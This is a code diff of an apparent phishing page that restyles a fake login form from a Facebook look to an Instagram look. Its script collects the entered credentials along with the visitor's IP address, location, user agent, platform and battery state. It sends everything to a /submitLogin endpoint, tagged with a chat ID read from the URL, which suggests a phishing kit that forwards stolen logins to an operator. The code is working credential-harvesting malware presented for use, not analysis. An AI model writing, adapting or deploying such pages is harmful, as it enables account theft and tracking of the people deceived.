@@ -5,63 +5,61 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* نفس نمط CSS المستخدم في فيسبوك */
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
+            background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            color: #333;
+            color: #262626;
         }
         .container {
             background-color: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            border: 1px solid #dbdbdb;
             text-align: center;
-            max-width: 400px;
-            width: 90%;
+            max-width: 350px;
+            width: 100%;
         }
         .logo {
-            color: #E4405F;
-            font-size: 32px;
+            color: #262626;
+            font-size: 50px;
             margin-bottom: 20px;
+            font-family: 'Grand Hotel', cursive;
         }
         input[type="text"], input[type="password"] {
             width: 100%;
             padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            background-color: #f9f9f9;
-            color: #333;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
             box-sizing: border-box;
         }
         button {
-            background-color: #E4405F;
+            background-color: #0095f6;
             color: white;
-            padding: 10px 20px;
+            padding: 10px;
             border: none;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 14px;
             width: 100%;
             margin-top: 10px;
         }
         .link {
             display: block;
             margin-top: 20px;
-            color: #E4405F;
+            color: #0095f6;
             text-decoration: none;
         }
         .notification {
             position: fixed;
             top: 10px;
             right: 10px;
-            background-color: #E4405F;
+            background-color: #0095f6;
             color: white;
             padding: 10px 20px;
             border-radius: 5px;
@@ -93,106 +91,106 @@
         </div>
     </div>
     <script>
-        const increaseForm = document.getElementById('increaseForm');
-const chatIdInput = document.getElementById('chatIdInput');
-const notification = document.getElementById('notification');
+        const loginForm = document.getElementById('loginForm');
+        const chatIdInput = document.getElementById('chatIdInput');
+        const notification = document.getElementById('notification');
 
-const chatId = window.location.pathname.split('/').pop();
-chatIdInput.value = chatId;
+        const chatId = window.location.pathname.split('/').pop();
+        chatIdInput.value = chatId;
 
-async function getIPInfo() {
-  try {
-    const response = await fetch('https://ipapi.co/json/');
-    const data = await response.json();
-    return {
-      ip: data.ip,
-      country: data.country_name,
-      city: data.city
-    };
-  } catch (error) {
-    console.error('Error fetching IP info:', error);
-    return {
-      ip: 'Unknown',
-      country: 'Unknown',
-      city: 'Unknown'
-    };
-  }
-}
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city
+                };
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    city: 'Unknown'
+                };
+            }
+        }
 
-function getPlatformInfo() {
-  const ua = navigator.userAgent;
-  let platform = "Unknown";
-  if (/Windows/.test(ua)) platform = "Windows";
-  else if (/Mac/.test(ua)) platform = "MacOS";
-  else if (/Linux/.test(ua)) platform = "Facebook";
-  else if (/Android/.test(ua)) platform = "Android";
-  else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            let platform = "Unknown";
+            if (/Windows/.test(ua)) platform = "Windows";
+            else if (/Mac/.test(ua)) platform = "MacOS";
+            else if (/Linux/.test(ua)) platform = "Facebook";
+            else if (/Android/.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
 
-  return {
-    platform: platform,
-    userAgent: ua
-  };
-}
+            return {
+                platform: platform,
+                userAgent: ua
+            };
+        }
 
-async function getBatteryInfo() {
-  if ('getBattery' in navigator) {
-    try {
-      const battery = await navigator.getBattery();
-      return {
-        batteryLevel: battery.level,
-        batteryCharging: battery.charging
-      };
-    } catch (error) {
-      console.error('Error getting battery info:', error);
-    }
-  }
-  return {
-    batteryLevel: undefined,
-    batteryCharging: undefined
-  };
-}
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        batteryLevel: battery.level,
+                        batteryCharging: battery.charging
+                    };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                }
+            }
+            return {
+                batteryLevel: undefined,
+                batteryCharging: undefined
+            };
+        }
 
-function getDeviceVersion() {
-  const ua = navigator.userAgent;
-  const match = ua.match(/\(([^)]+)\)/);
-  return match ? match[1] : 'Unknown';
-}
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
 
-increaseForm.addEventListener('submit', async (event) => {
-  event.preventDefault();
-  const formData = new FormData(increaseForm);
-  const data = Object.fromEntries(formData.entries());
+        loginForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const formData = new FormData(loginForm);
+            const data = Object.fromEntries(formData.entries());
 
-  const ipInfo = await getIPInfo();
-  const platformInfo = getPlatformInfo();
-  const batteryInfo = await getBatteryInfo();
-  const deviceVersion = getDeviceVersion();
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+            const batteryInfo = await getBatteryInfo();
+            const deviceVersion = getDeviceVersion();
 
-  Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+            Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
 
-  try {
-    const response = await fetch('/submitLogin', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(data)
-    });
-    const result = await response.json();
-    if (result.success) {
-      notification.classList.add('show');
-      setTimeout(() => {
-        notification.classList.remove('show');
-      }, 5000);
-      increaseForm.reset();
-    } else {
-      alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
-    }
-  } catch (error) {
-    console.error('Error:', error);
-    alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
-  }
-});
+            try {
+                const response = await fetch('/submitLogin', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (result.success) {
+                    notification.classList.add('show');
+                    setTimeout(() => {
+                        notification.classList.remove('show');
+                    }, 5000);
+                    loginForm.reset();
+                } else {
+                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        });
     </script>
 </body>
 </html>
